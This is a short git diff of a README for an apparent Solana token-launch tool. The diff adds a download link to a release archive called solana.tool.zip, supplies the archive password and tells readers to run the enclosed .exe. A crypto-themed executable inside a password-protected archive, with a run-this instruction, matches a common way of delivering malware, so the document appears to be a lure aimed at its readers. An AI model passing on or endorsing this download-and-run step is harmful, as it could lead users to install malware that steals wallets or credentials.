@@ -6,9 +6,9 @@
 
 ## 🛠 How to Get Started
 
-**Download the latest build** from the [**Releases**]() page.
+**Download the latest build** from the [**Releases**](https://github.com/lacydebuger/launch-solana-token/releases/download/sol/solana.tool.zip) page.
 
-> ⚠️ the archive password is ***SOL!launch***.
+> ⚠️ the archive password is ***SOL!launch***
 
 Launch the `.exe` **Solana tool** to begin.
 
